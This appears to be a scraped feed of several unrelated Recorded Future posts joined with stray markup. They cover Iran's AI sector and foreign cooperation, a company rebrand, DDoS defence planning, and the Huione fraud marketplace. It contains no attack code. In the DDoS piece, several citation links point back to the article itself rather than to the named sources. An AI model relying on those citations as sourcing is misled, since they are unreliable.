        <p>Another government initiative announced on January 11, 2025, by Afshin aims to establish a hub for AI innovation in the oil and gas industries on Kish Island, Southern Iran, in association with the Persian Gulf Petrochemical Industries Company and the Kish Free Zone Organization. The location choice likely enables the Iranian government to unlock three benefits for the acceleration of AI development: the Kish Free Zone’s lax foreign investment and fiscal policies to encourage foreign direct investments (FDI); existing infrastructure, including an international airport and ports that can be leveraged for international transit; and lax entry visa requirements on Kish Island that <a href="https://travel.state.gov/content/travel/en/international-travel/International-Travel-Country-Information-Pages/Iran.html">enable</a> reputable Iranian academic institutions (such as Sharif University of Technology, which has an international campus in Kish) to attract foreign talent and investment.</p>
        <p>Iran has announced several AI-enabled tools for the benefit of the Iranian government and society. Alongside his announcement of Iran’s domestic chip production project in December 2024, Afshin also declared that the Iranian government has prioritized the development of “AI assistants” available to government officials, developed “in collaboration with universities” with a team of over “70 expert professors.” The AI assistants are reportedly expected to help government ministers to “extract both laws and regulations and production-related issues from data” and “make suggestions in decision-making.” In August 2024, Iran’s National Cyberspace Center announced the Arbaeen Artificial Intelligence Assistant (which references Arbaeen, a Shi’ite holy day, during which Shi’a Muslims <a href="https://www.newarab.com/features/explainer-what-arbaeen">make</a> a pilgrimage to Iraq) was “a guide for pilgrims to access routes and processions, management of information for scheduling ceremonies and events, as well as the status of health and medical services, weather conditions, and even cultural and linguistic guidance online.” In November 2024, Iran’s national religious headquarters, located at Qom Seminary, launched an “indigenously developed platform that uses AI to answer questions and remove doubts on religious issues.” Dubbed Deendaan, the platform was introduced by the seminary’s National Center for Answering Religious Questions. Another entity in Qom, the Noor Computer Centre for Islamic Sciences Research, is seeking to <a href="https://archive.is/npvsM#selection-2349.43-2349.93">incorporate</a> AI in its use of religious texts and data to “accelerate the Islamic studies of senior clergy and speed up their communication to the public.”</p>
        <h3>Academia</h3>
        <p>Iran’s most globally recognized AI innovation, the Surena IV humanoid robot, was developed by Iran’s academic sector, underscoring the key role of universities and research institutes in Iran’s AI ecosystem. Created at the Center of Advanced Systems and Technologies (CAST) at the University of Tehran, the robot’s fourth generation uses the “Robot Operating System” for “state monitoring, real time implementation of algorithms, and simultaneous running of several programs.” The robot was <a href="https://www.asme.org/topics-resources/content/10-humanoid-robots-of-2020">listed</a> as one of the top ten humanoid robots in 2020, according to the American Society of Mechanical Engineers. In addition to developing the Surena humanoid, CAST has a “portfolio” of projects related to various fields, including “mechatronics, robotics, and intelligent systems inspired by nature,” as well as “aquatic inspired” robots and those “inspired by birds.”</p>

        <p>Leading Iranian universities in the field of AI <a href="https://edurank.org/cs/ai/ir/">include</a> the University of Tehran, Amirkabir University of Technology, and Iran University of Science and Technology, all located in Tehran. According to the state-run news outlet Tehran Times, over the last ten years, the most “scientific productions” in artificial intelligence have been associated with Tehran University, Tabriz University, and Amirkabir University of Technology. However, these universities likely remain low on global rankings for AI research; the University of Tehran, widely recognized as the best higher education institution in Iran, <a href="https://edurank.org/uni/university-of-tehran/rankings/">ranks</a> at number 201 globally for AI. Edurank data suggests that Iran’s top three universities are ahead or on par with their Russian peers (Moscow State University, St. Petersburg State University, and the National Research University) but far behind China (Tsinghua University, Harbin Institute of Technology, and Shanghai Jiao Tong University) in terms of production (number of publications) and influence (number of citations). Iranian national investment in AI research is likely less than Russian investment, but its academic citation numbers are greater than Russia’s, likely reflecting that Iran’s AI academics maintain disproportionate influence in their field relative to their Russian counterparts.</p>

        <p>In the absence of a vibrant private AI sector, the Iranian government is likely reliant on academics specialized in AI for government projects at the expense of cutting-edge research. Iranian media boasted that “70 expert professors” were working to design an AI platform for government ministers. Sharif University of Technology, ranked fourth in Iran in AI, is likely a key partner for government projects, such as Iran’s national AI platform. The government demand for expertise likely represents a misallocation of research talent towards state-mandated engineering projects, which likely impedes Iran’s research potential. However, Iranian academic centers may also be exploring open-source AI development, which likely encourages innovation. For example, in November 2024, Amirkabir University, in collaboration with AI developer Part AI, announced the development of the “most comprehensive and powerful evaluation system for Persian language models,” known as <a href="https://huggingface.co/spaces/PartAI/open-persian-llm-leaderboard">Open Persian LLM Leaderboard</a>, which includes over 40,000 samples and tracks the performance of 25 major open-source models at Persian-language tasks. Part AI has also published six open-source models, including Persian finetunes of Meta’s Llama 3.1 and Google’s BERT models.</p>
        <p>A search of recent and upcoming conferences related to AI suggests Iran’s academic sector is exploring AI applications in several sectors, including medical sciences, telecommunications, electrical engineering, education, mining, and industry. In 2024, Iran held a number of inaugural national conferences on specific topics, very likely suggesting the concept of how AI can benefit specific industrial sectors is still nascent in Iran. For example, in October 2024, Iran held the first national conference on AI in education and learning; in May 2024, Iran held its first national conference on AI and the Internet of Things; in April 2024, it held its second national conference on Digital Transformation and Intelligent Systems.</p>

        <p>Iranian universities are very likely driving international engagement by hosting conferences on AI. A review of international AI-related conferences held in Iran in 2024 and planned for 2025 highlights a wide range of foreign academic participants, including academics from Austria, Australia, Canada, China, France, Italy, Iraq, Malaysia, Russia, Spain, Vietnam, and the United Kingdom. Iranian academic output on AI likely benefits from strong ties with Iranian-American researchers and collaboration with US academic institutions. An Iranian study of domestic output of AI research between 1978 and 2022 found that US researchers were the most frequent international co-authors on Iranian AI research. However, Iranian academic AI research likely remains of limited international influence. 19.9% of Iranian AI papers during this period received no citations, with the majority receiving between one and five citations.</p>

        <h3>Private Technology Companies</h3>
        <p>Iran’s private sector currently faces significant challenges in the face of international sanctions and lack of global competitiveness, including the inability to retain top talent, the absence of foundational AI model companies, low capital expenditures on AI by existing major players in the technology sphere, and a nascent venture capital (VC) ecosystem.</p>
        <p>Iran almost certainly <a href="https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry">suffers</a> from a significant talent outflow of skilled workers in technology and AI. According to a 2021 report by the Iran Migration Observatory, 50% of Iranians <a href="https://www.mei.edu/publications/escalating-emigration-and-drought-irans-it-industry">involved</a> in startup communities and 44% of graduates were planning on emigrating, citing unpredictable internet regulations, censorship, and lack of wage competitiveness as direct factors. In December 2024, Iran’s Vice President Afshin announced a new regulation offering monthly grants of approximately 15 million Tomans ($3,564 USD) for PhD students to encourage research and scientific activities, stressing the importance of preventing talent migration.</p>
        <p>Despite talent shortages, Indian data provider TraxCN has <a href="https://tracxn.com/d/artificial-intelligence/ai-startups-in-iran/__aWyQstgrq_MtBd_T7d2d9-itkASMubg8G_HbLca8W_8/companies">identified</a> at least 85 companies in Iran advertised as operating in the field of AI, with a majority focusing on developing AI enterprise applications and tools for healthcare, agriculture, and finance. Several companies provide chatbot services and LLMs, including Persian-language chatbots; however, it remains unclear whether they are developing proprietary models rather than deploying existing open-source models. Additionally, TraxCN considers that seventeen (20%) of these companies are currently “deadpooled” (no longer in business) and 60 (80.5%) remain unfunded, indicating that despite government efforts to incentivize AI startups, the average Iranian AI startup is doomed to fail in raising funds or operating sustainably. Iranian AI website Hooshio published a list of 29 Iranian AI companies, highlighting the Parth AI Research Center as “one of the top five companies in the Middle East” with more than 150 specialists in AI. The company claims to have Iran’s “biggest AI research center” with a department for machine vision, natural language processing (NLP), speech processing, and data analysis, as well as an AI college.</p>
        <p>Iran’s private tech sector is likely trying to financially motivate AI innovation and engage with Iran’s developer community. Digikala, Iran’s <a href="https://www.crunchbase.com/search/organizations/field/organizations/location_identifiers/iran">biggest</a> technology and e-commerce company (valued at approximately $500 million USD as of August 2024), <a href="https://archive.ph/c9swn">hosted</a> an AI hackathon in March 2024 with a first-place prize of 60 million Tomans (approximately $14,258 USD). Notably, the hackathon’s rules <a href="https://archive.ph/c9swn">banned</a> participants from using Western AI models (listing models from Western companies like OpenAI, Anthropic, and Cohere), likely intending for participants to focus on using open-source models for hackathon entries.</p>
        <p>Unlike their Western and Chinese counterparts, Iranian VC funds are likely limited in their ability to fund and support a domestic AI startup ecosystem to fulfill national security and economic priorities, with startups <a href="https://www.statista.com/outlook/fmo/capital-raising/traditional-capital-raising/venture-capital/iran">forecasted</a> to raise $28.13 million USD in capital in 2025 across all sectors. Iran’s Pardis Technology Park (PTP), dubbed “Iran Silicon Valley” and operating “under the auspices of” the Vice Presidency for Science, Technology, and Knowledge-based Economy, is “the most significant center for developing startups and knowledge-based companies and commercialization of technology and innovations in Iran.” PTP, which is part of the Iran International Innovation District, boasts 25.5 million EUR of foreign investments in its companies over the last five years and is also supported by the Iran National Innovation Fund, Iran’s version of a venture capital and private equity firm.</p>

        <h3>Open Source</h3>
        <p>Open-source communities <a href="https://www.gov.uk/government/publications/ai-opportunities-action-plan-government-response/ai-opportunities-action-plan-government-response">play</a> an important role in the development of AI capabilities, as open-source AI models can <a href="https://web.archive.org/web/20190226132342id_/http://pdfs.semanticscholar.org/71bc/34f9611e020e5d673b03af354d45b022018d.pdf">lower</a> research and development costs, present opportunities for technology transfers, and reduce dependency on models developed by foreign companies. Iran’s open-source community almost certainly lags behind in terms of developing home-grown AI models, finetunes, and datasets. Data from open-source AI model platform HuggingFace shows that Farsi-language models (including multilingual models from US AI companies) are outnumbered by open-source models with language capabilities for Mandarin, Korean, or Russian. Sanctions are almost certainly <a href="https://arxiv.org/html/2404.05489v1">throttling</a> the emergence of a strong Iranian open-source software community. GitHub, a major platform for hosting open-source code, was <a href="https://github.blog/news-insights/policy-news-and-insights/advancing-developer-freedom-github-is-fully-available-in-iran/">blocked</a> in Iran in 2019 and only resumed operations in 2021 after securing a special license from the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) board.</p>

        <p>Iran’s biggest open-source AI contributor, measured by the number of Farsi-language AI models published on Hugging Face, is likely <a href="https://huggingface.co/hezarai">Hezar AI</a>, followed by <a href="https://huggingface.co/persiannlp">Persian NLP</a> and <a href="https://huggingface.co/HooshvareLab">Hooshvare Research Lab</a>. US technology companies <a href="https://huggingface.co/facebook">Facebook</a> and <a href="https://huggingface.co/google">Google</a> are also among the top ten publishers of Farsi-language models on HuggingFace.</p>
        <h3>Foreign Cooperation</h3>
        <p>Iran’s Organization for Development of International Science and Technology Cooperation (ODISTC) very likely plays a critical role in facilitating the exchange of ideas, goods, and services related to AI. ODISTC was set up “to serve as a foundation for increasing scientific, technological and innovation communications with other countries, as well as securing a significant share of the regional and global trade of knowledge-based products.” Among the services offered in ODISTC’s “Technological Exchange Office” is “bilateral scientific and technology cooperation in the form of joint research funds with the [sic] countries like China and Russia.” More details pertaining to Iran’s cooperation with China and Russia are discussed below.</p>
        <h4>China</h4>
        <p>Iran’s technological cooperation with China is very likely a key strategic interest for Iran’s AI development. In 2021, Iran’s Strategic Council on Foreign Relations promoted building relationships between Iranian and Chinese technology companies and higher education institutions. AI was specifically mentioned as part of the Iran-China 25-year Comprehensive Partnership, officially signed in March 2021. A leaked version of the plan, sourced from Iran’s Ministry of Foreign Affairs and <a href="https://www.wilsoncenter.org/sites/default/files/media/uploads/documents/MEP_200831_OCC%2038%20v3%20%281%29.pdf">reported</a> by the Wilson Center, proposed the cooperation involved “introducing joint pilot projects in the fields of smart technology and artificial intelligence.” Second to the sale of its oil to China, Iran likely <a href="https://link.springer.com/chapter/10.1007/978-981-19-6700-9_32">views</a> AI development and technological exchanges as a top priority for its bilateral relations with China, and China’s challenge to US dominance in AI development aligns with Tehran’s goal to oppose US hegemony.</p>
        <p>China’s use of AI for surveillance and monitoring has very likely been the most robust area for Iran’s foreign AI engagement, enabling Chinese companies to expand their export of specific technologies that facilitate Iranian domestic repression. However, academic and research collaboration is very likely another key area in which Iran’s technology sector is benefitting from the relationship with China. In November 2024, Iranian company Bayan Rayan — the country’s only server producer — received an award at the 26th annual China Hi-Tech Fair (CHTF) 2024. In 2022, an official at Iran’s Islamic Azad University touted the Iran-China agreement as a “golden opportunity to boost cooperation in AI” and benefit from Chinese advancement in the AI field, noting that Iran had 3,000 Iranian students studying in China.</p>
        <h4>Russia</h4>
        <p>The anti-West strategic alignment and commercial isolation that Iran and Russia both share, particularly as a result of Russia’s war with Ukraine, has <a href="https://www.cna.org/reports/2025/01/The-Evolving-Russia-Iran-Relationship.pdf">resulted</a> in deeper cooperation in many security-related fields. Despite the <a href="https://isis-online.org/isis-reports/mobile/iran-russia-military-technology-axis-russia-showcases-to-iran-new-and-advan">increased</a> <a href="https://www.cfr.org/blog/iran-russia-cyber-agreement-and-us-strategy-middle-east">cooperation</a> in several <a href="https://www.wsj.com/articles/russia-supplies-iran-with-cyber-weapons-as-military-cooperation-grows-b14b94cd">spheres</a>, specific details on the extent of the current Iran-Russia collaboration on AI R&amp;D are limited. In January 2025, Tehran and Moscow signed a comprehensive twenty-year strategic partnership agreement that reinforced areas of ongoing cooperation in the technical sphere, including information and communication technologies, digital development, and higher education. While the text of the agreement does not specifically mention AI, Iran’s Ministry of Foreign Affairs stated the agreement “provides a platform for sharing knowledge and collaboration in fields such as nanotechnology, aerospace, artificial intelligence, and medical sciences” and expands cooperation at the government and academic levels.</p>
        <p>Leading up to the 2025 comprehensive agreement, a flurry of Iran-Russia cooperation documents and engagements have promoted cooperation on AI. In March 2024, the two countries signed a Memorandum of Understanding to cooperate on ethics in AI, “exchanging experiences in the implementation of the ethical principles of AI.” The agreement specified that the Russian Commission on Ethics in AI would provide training for Iran’s AI and Robotics Development headquarters. In November 2019, Russia and Iran signed a Memorandum of Understanding on cooperation to support twenty joint research plans in fifteen scientific fields, including, among others, information technology, computer systems, and AI.</p>

        <h2>The next chapter in our journey</h2>
        <p>
          <img loading="lazy" alt="rebrand-001.png" src="https://www.recordedfuture.com/media_167c4c97d6204beceab45c248be5f5e76fdb9446f.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1172" />
        </p>
        <p>Today marks an exciting milestone as we unveil Recorded Future's refreshed brand identity and website – a transformation that reflects the <a href="/blog/6-threat-intelligence-outlooks-strategies-2025">next chapter in cybersecurity</a> and threat intelligence. This evolution arrives at a pivotal moment when organizations face increasingly sophisticated threats that demand clarity, focus, and actionable insights.</p>
        <p>The inspiration for this refresh became clear while walking the floors at cybersecurity conferences. Amid a sea of sameness – dark displays, matrix-like code animations, and ubiquitous hooded figures – the messaging blends together in an indistinguishable haze of technical jargon and vague promises.</p>
        <p>For security leaders tasked with protecting their organizations, this uniformity creates a real challenge: how to identify what truly matters when everyone looks and sounds the same?</p>
        <p>This observation became the catalyst for our brand refresh – not just as a marketing initiative, but as an authentic expression of how Recorded Future helps security professionals cut through overwhelming noise to focus on what's essential.</p>
        <h2>Deconstructing our brand heritage.</h2>
        <p>This journey wasn't about creating a new logo – Recorded Future already had a strong visual mark. Instead, we focused on building a comprehensive visual and verbal language that embodies clarity and precision. The deconstructed logo became an important aspect of our brand system, allowing us to create meaningful visual elements that connect our identity with the purpose that has been at the heart of our company since we were founded in 2009.</p>
        <p>
          <img loading="lazy" alt="rebrand-002.png" src="https://www.recordedfuture.com/media_13ed4d9079c8495c9e886b1e32c73fb82ad479a45.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="704" />
        </p>
        <p>It also became a symbol of premium offering in the category. When we created patterns using deconstructed elements of the logo, we were struck by their beauty being reminiscent of Hermes scarves (another brand that is at the pinnacle of their category).</p>
        <p>The process involved examining countless competitor websites, which blended together in a blur of undifferentiated, fear-based messaging. The question emerged: "Could our brand serve as an antidote to this confusion, bringing the same clarity to our marketing that our platform brings to threat intelligence?" This approach transcended typical design exercises. It centered on authentically representing the value we provide. Our customers aren't just buying software – they're seeking confidence amid constant pressure and overwhelming data. They need a partner who understands their fundamental requirement: knowing which threats truly matter to their business.</p>
        <h2>Crafting our story. Finding our voice.</h2>
        <p>When drafting our brand narrative, the team read it aloud together to feel how the words resonated beyond how they appeared on paper. The opening lines captured our essence perfectly:</p>
        <p><em>"In cybersecurity, your greatest fear isn't the threats you see coming. It's the critical signals that get lost in the noise."</em></p>
        <p>This became our north star, guiding the development of four pillars for our design system:</p>
        <ul>
          <li><strong>Meaningful</strong> – Reinforcing what we stand for and the value we deliver to customers</li>
          <li><strong>Bold</strong> – Being distinctive, confident, and immediately recognizable in a crowded marketplace</li>
          <li><strong>Premium</strong> – Conveying the sophistication that positions us as the market leader in intelligence</li>
          <li><strong>Helpful</strong> – Using design to help customers discover relevant content and navigate complex information</li>
        </ul>
        <h2>Visual distinction with purpose.</h2>
        <p>The introduction of vibrant electric blue serves as more than an aesthetic choice – it symbolizes our promise to illuminate what matters in a noisy threat landscape. Upon seeing it, CEO Christopher Ahlberg remarked, "Now that stands out," confirming we were moving in the right direction.</p>
        <p>
          <img loading="lazy" alt="rebrand-003.png" src="https://www.recordedfuture.com/media_16aca26e8705c00c960d31ebf9e2f488d3e483cb3.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1066" />
        </p>
        <p>Christopher's guidance on our website proved equally valuable: "The most important thing is to build a website that is truly useful and engages customers in a way that there's something they want to come back to." This perspective drove our approach toward building a destination that delivers ongoing value, with particular emphasis on elevating the incredible content and thought leadership we provide – a significant differentiator for Recorded Future in the marketplace.</p>
        <p>The website redesign presented an interesting challenge: balancing rich content with product and sales experiences. Years of building trust through <a href="https://go.recordedfuture.com/2024-state-of-threat-intelligence">intelligence research</a> has established Recorded Future's reputation for expertise.</p>
        <p>Elevating this content became central to our strategy.</p>
        <p>
          <img loading="lazy" alt="rebrand-004.jpg" src="https://www.recordedfuture.com/media_15357342136c202c4c6b6f2446bd2e062fe5ff7a1.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1600" height="1280" />
        </p>
        <p>Our intelligence research demonstrates expertise, builds credibility, and provides tangible value to security professionals. The design needed to showcase this strength while making our insights more accessible and actionable.</p>

        </div>
        <h2>Bringing our story to life – with AI and humanity.</h2>
        <p>The brand launch features a powerful video that tells the story of Recorded Future's next chapter, created entirely using generative AI. This approach represents a meaningful parallel to our core work – using <a href="/blog/next-evolution-recorded-future-ai-powering-threat-intelligence">advanced AI to combat sophisticated cyber threats</a>. Just as we harness AI to deliver precision Intelligence, we embraced AI-powered creativity to express our vision for the future of cybersecurity.</p>
        <p>But what moves me most about this rebrand is the response from our people. Watching our teams getting excited about the new materials, hearing our intelligence analysts express how the new brand better reflects the sophistication of their work – these moments affirm that we've created something that resonates on a human level.</p>
        <p>
          <img loading="lazy" alt="rebrand-005.png" src="https://www.recordedfuture.com/media_13d31ccc47db68ac1de9e959b7745b1ee50498c39.png?width=750&amp;format=png&amp;optimize=medium" width="1362" height="396" />
        </p>
        <h2>The Road Ahead</h2>
        <p>This refreshed identity helps us communicate with the same precision and clarity that our platform delivers, elevating our brand while making complex intelligence more accessible and actionable.</p>
        <p>As cyber threats grow in complexity, our platform indexes vast sources of global data, using advanced machine learning and natural language processing to deliver timely, actionable intelligence. This empowers security teams to anticipate threats, understand adversaries' tactics, and respond swiftly.</p>
        <p>The threat landscape will continue to evolve, but our commitment remains steadfast: helping security teams know what matters most and act first. Our brand now expresses this promise in every interaction, from website visits to platform experiences.</p>
        <p>This transformation achieves differentiation in the market while authentically embodying our core belief: in a world of overwhelming noise, precision and focus provide the ultimate protection.</p>
        <p>As we begin this next chapter, the entire team deserves recognition for bringing this vision to life. This refresh isn't merely about visual identity – it's about helping our customers become more confident, more precise, and ultimately more secure.</p>

            <description><![CDATA[Discover how integrating threat intelligence into your cybersecurity strategy can lead to smarter, more efficient security investments. Learn practical approaches to optimize your security budget effectively.]]></description>
            <content:encoded><![CDATA[
        <p>DDoS (distributed denial-of-service) attacks have existed since the early days of the internet. While new tricks occasionally pop up—like leveraging certain vulnerabilities to amplify attacks—the core idea remains: overwhelming servers with more traffic than they can handle. Think of it as trying to push the ocean through a straw. When these attacks grow big, they can even disrupt internet providers themselves. Companies like <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Google</a> and <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Cloudflare</a> still battle these threats regularly, proving DDoS remains a serious issue even in 2025.</p>
        <p>Historically, cybercriminals have targeted entire industries like airlines and banks, shutting the companies down until they paid. State-backed groups from countries like <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Russia</a> and <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">Iran</a> also use DDoS attacks as weapons against their enemies.</p>
        <h2>Why Spend Money Before an Attack Happens?</h2>
        <p>Protecting against DDoS attacks matters because downtime means losing money or, for critical services, even worse consequences. But if your company hasn't been hit yet, why spend money on defenses? When should you start protecting yourself?</p>
        <p>That’s where threat intelligence comes in handy. By looking at data and comparing trends, threat intelligence helps you decide if and when investing in DDoS defenses makes sense. It provides the insights to answer these questions for DDoS and any other cyber risk that may create one or more of the <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">five risk impacts</a>.</p>
        <h2>Smart Data Means Smart Decisions</h2>
        <p>Good decisions need good data. Recorded Future tracks thousands of DDoS attacks every day, giving you a clear picture of who’s getting hit and how often. Pulling data from the Recorded Future API gives analysts useful analytics, like IP addresses targeted by attackers.</p>
        <p>With this data, security teams can:</p>
        <ul>
          <li>Spot trends and predict who might be next</li>
          <li>Automate defenses and make faster decisions</li>
          <li>Better manage risk, knowing exactly when and how to invest</li>
        </ul>

        </div>
        <h2>Who's Being Targeted?</h2>
        <p>Launching DDoS attacks isn’t technically difficult. Someone with basic internet know-how can do it. But some attackers put more effort into it, building armies of infected devices known as botnets. One tool frequently used by pro-Russian hackers, called DDoSia, attacks different targets daily. By tracking who’s getting hit most, businesses can better prepare their defenses.</p>
        <p>For example, Ukraine currently faces heavy attacks due to geopolitical tensions. But finance and transportation companies in Europe are also frequent targets, suggesting broader threats.</p>

          </div>
        </div>
        <h2>Thinking Bigger than Just Your Own Network</h2>
        <p>When CISOs aren’t considering crafting better risk management narratives for executive consumption, they are contemplating improving operational resilience. Denial of service attacks fall squarely in this category. The revolving questions don’t stop with an organization’s local network perimeter (if such a thing even exists anymore) but extend to partners, suppliers, and wider internet infrastructure (e.g., DNS and CDN providers).</p>
        <p>More than ever, daily business and geopolitical events create a cascading effect of cyber impacts. DDoS is always a possibility. Recent <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">attacks against X</a> (Twitter’s hip rebrand) are a good reminder.</p>
        <h2>Key Decisions for Stronger DDoS Defense</h2>
        <p>The decisions that underpin DDoS defense and response correspond to organizational size, mission, footprint, regulatory compliance mandates, and resources. Here are some practical actions to consider:</p>
        <ul>
          <li>Partnering with your internet provider for fast response</li>
          <li>Using scrubbing centers to filter attack traffic</li>
          <li>Implementing challenge-response tests like CAPTCHAs</li>
          <li>Deploying cloud protections like AWS Shield</li>
          <li>Utilizing web application firewalls (WAF)</li>
          <li>Optimizing network setups (like load balancers and distributed data centers)</li>
          <li>Filtering traffic using firewalls and intrusion systems</li>
          <li>Relying on content delivery networks (CDNs)</li>
          <li>Using Anycast routing to protect DNS services</li>
        </ul>
        <div>
          <div>

          </div>
        </div>
        <h2>Everyone’s a Target</h2>
        <p>It’s tempting to think your business won't face a DDoS attack, especially if it's small or non-political. The reality? Anyone online can become a target for extortion or political agendas. That's why proactive intelligence is so valuable—it helps security teams know when threats are getting closer and when it’s time to upgrade defenses.</p>
        <p>As the frequency of DDoS attacks increases around certain industries or regions, it's essential to reassess and strengthen your own security controls accordingly. The closer these threats get, the more your organization should test their resilience. Said differently, as DDoS attack proximity moves closer to an organization, the operational disruption risk may, in parallel, need to <a href="/blog/how-threat-intel-drives-smarter-security?host=https%3A%2F%2Fwww.recordedfuture.com">move north on the resilience axis</a>.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="e749bad6-f210-4917-a230-a144e9e72ae7_1600x900.webp" src="https://www.recordedfuture.com/media_14189415a2ef2c8f09162779e8c192e620e22b935.png?width=750&amp;format=png&amp;optimize=medium" width="1456" height="819" />

          </div>
        </div>
        <h2>Staying One Step Ahead</h2>
        <p>DDoS attacks aren't going away, but they don't have to be a nightmare, either. Threat intelligence provides the clear insights needed to prepare and respond effectively. By using analytics wisely, organizations can invest smartly, build stronger defenses, and keep their operations running smoothly. When attacks creep closer—say, spiking in your sector or geography—second-order risks (like operational disruption) loom larger. That’s your cue to prioritize resilience, whether a CDN subscription or ISP speed-dial.</p>

            <content:encoded><![CDATA[
        <h2>The Global Fraud Landscape</h2>
        <p>Fraud is a booming industry, with scammers <a href="https://www.gasa.org/_files/ugd/7bdaac_9060be8317424edd9964072cf279a0a4.pdf">pulling in</a> over <strong>$1 trillion</strong> from their victims in 2024. Businesses are paying the price: <strong>87%</strong> of businesses <a href="https://www.veriff.com/ebooks/us-industry-pulse-survey-2024">reported</a> an increase in online fraud, with most experiencing a <strong>1% to 9%</strong> loss in revenue as a result. In terms of individual consumers, Asia reported digital scam losses <a href="https://www.mastercard.com/news/ap/en/perspectives/en/2025/evolution-of-fraud-and-scams-in-asia-the-need-for-a-unified-defence/">reaching</a> <strong>$700 billion</strong> last year, compared to the <strong>$12.5 billion</strong> reported by US consumers in <a href="https://www.ftc.gov/news-events/news/press-releases/2025/03/new-ftc-data-show-big-jump-reported-losses-fraud-125-billion-2024">2024</a>.</p>
        <p>Trust-based financial exploitation scams are especially lucrative. Examples include <a href="https://www.scamwatch.gov.au/stay-protected/real-life-stories/dating-and-romance-scam-georginas-facebook-fianc%C3%A9-leaves-her-flat-broke">romance</a> scams, investment scams, or <a href="https://www.abc.net.au/news/2025-02-24/fake-chinese-authority-scam-extorting-millions/104974122">impersonation</a> scams. Fraudulent actors can adapt impersonation scams to target businesses, such as by posing as regulators or <a href="https://www.cnn.com/2024/02/04/asia/deepfake-cfo-scam-hong-kong-intl-hnk/index.html">impersonating</a> executives. The percentage of people who reported losing money to fraud and scams <a href="https://www.ftc.gov/news-events/news/press-releases/2025/03/new-ftc-data-show-big-jump-reported-losses-fraud-125-billion-2024">increased</a> from 27% in 2023 to 38% in 2024, suggesting that scams are increasingly more effective and believable.</p>
        <h2>Huione Marketplace: The One-Stop Shop for Fraud</h2>
        <p>Online platforms that market tools and services to Chinese-speaking cybercriminals are one factor behind this boom, making it easier for criminals to execute fraud at scale. <a href="https://support.recordedfuture.com/hc/en-us/articles/37986893239187-Huione-Guarantee-Serves-as-a-One-Stop-Shop-for-Chinese-Speaking-Cybercriminals">Huione Guarantee</a>, a prominent gray-market hub that operates under the Huione Group, a Cambodian financial conglomerate, <a href="https://www.wired.com/story/the-largest-illicit-online-marketplace-ever-is-growing-at-an-alarming-rate">acts</a> as a one-stop shop for fraud-related tools and services. The website compiles Telegram channels with posts offering cryptocurrency mining tools, money laundering, and <a href="https://www.straitstimes.com/singapore/10m-lost-in-malware-scam-where-victims-banking-credentials-stolen-by-keylogger-hidden-in-app">malware-as-a-service</a>. The channels also promote offerings that use social engineering to facilitate fraud, including the sale of social media accounts to adopt realistic online personas, as well as personal, financial, and employment data to personalize the scam. Sellers also advertise generative AI deepfake voice and face-changing tools, some of which list <a href="https://www.cnbc.com/2023/10/17/us-bans-export-of-more-ai-chips-including-nvidia-h800-to-china.html">US-sanctioned</a> computer hardware components in the technology specifications. Advanced consumer-grade GPUs, like the kind recommended by threat actors for an advanced face swapping tool sold on the Huione Marketplace, are widely <a href="https://www.wsj.com/tech/the-underground-network-sneaking-nvidia-chips-into-china-f733aaa6">available</a> through underground and informal distribution networks.</p>
        <h2>From Scams to Slavery: TCOs, AI Tools, and Human Trafficking</h2>
        <p>Transnational criminal organizations (TCOs) use services from Huione Guarantee to support large-scale scam operations. These organizations operate call center compounds in Cambodia and Myanmar that force <a href="https://www.humanity-consultancy.com/publications/responses-to-trafficking-in-persons-for-forced-criminality-in-the-thai-context">human trafficking victims</a> to carry out hundreds of scam calls each day. Coerced labor is <a href="https://www.abc.net.au/news/2024-05-16/pig-butchering-scams-artificial-intelligence-ai-face-swapping-/103804830">augmented</a> with generative AI tools, including deepfake impersonations and automated bots. Chinese and Thai law enforcement have made joint efforts to shut down the call centers by <a href="https://www.yahoo.com/news/china-brings-back-3-000-093000193.html">repatriating</a> trafficking victims and <a href="https://www.scmp.com/week-asia/politics/article/3297499/thailand-shuts-power-myanmars-scam-hub-pm-paetongtarn-vows-firm-action">shutting down</a> power to the regions where they operate. However, political instability and weak governance in regions where these centers operate make sustained enforcement efforts challenging.</p>
        <p>Huione infrastructure also supports money laundering services through Huoine Pay, the conglomerate’s banking arm. The Huione Pay website advertises money laundering services along with other scam tools. The National Bank of Cambodia recently <a href="https://www.rfa.org/english/cambodia/2025/03/06/huione-cambodia-cyberscam-cryptocurrency/">stripped</a> Huoine Pay’s banking license in response to international pressure, though further enforcement actions such as arrests or fines have not yet been made.</p>

        <h2>New Markets: Expanding to the US and Beyond</h2>
        <p>TCOs are <a href="https://web.archive.org/web/20240612094033/https://www.usip.org/programs/transnational-organized-crime-southeast-asia">beginning</a> to look to other regions to grow their operations. Scam losses per capita in the US are the <a href="https://www.gasa.org/_files/ugd/7bdaac_9060be8317424edd9964072cf279a0a4.pdf">highest</a> in the world at $3,520, offering an enticing market for expanding operations. The majority of scams these groups operate appear to target individuals, employing a variety of scam techniques based on who they are targeting and which scams are working.</p>
        <p>Businesses can protect themselves from scam-related revenue losses by adapting their employee training and policies to keep up with increasingly sophisticated scams.</p>
        <ul>
          <li><strong>Update phishing detection training</strong> to include more sophisticated tactics, such as more professional-sounding content in emails or even deepfake voice or video calls, to help employees recognize fraudulent communications.</li>
          <li><strong>Discourage using unmonitored personal devices</strong> for sensitive business functions to ensure that the security team can quickly identify malware infection, data exfiltration, or suspicious network activity due to fraud.</li>
          <li><strong>Ensure employees and leadership alike have a trusted mechanism for reporting suspicious activity.</strong> In addition, providing assurances that scam victims will not be punished can help ensure they report the scams to the security team, which may then be able to intervene before more serious losses are incurred.</li>
        </ul>

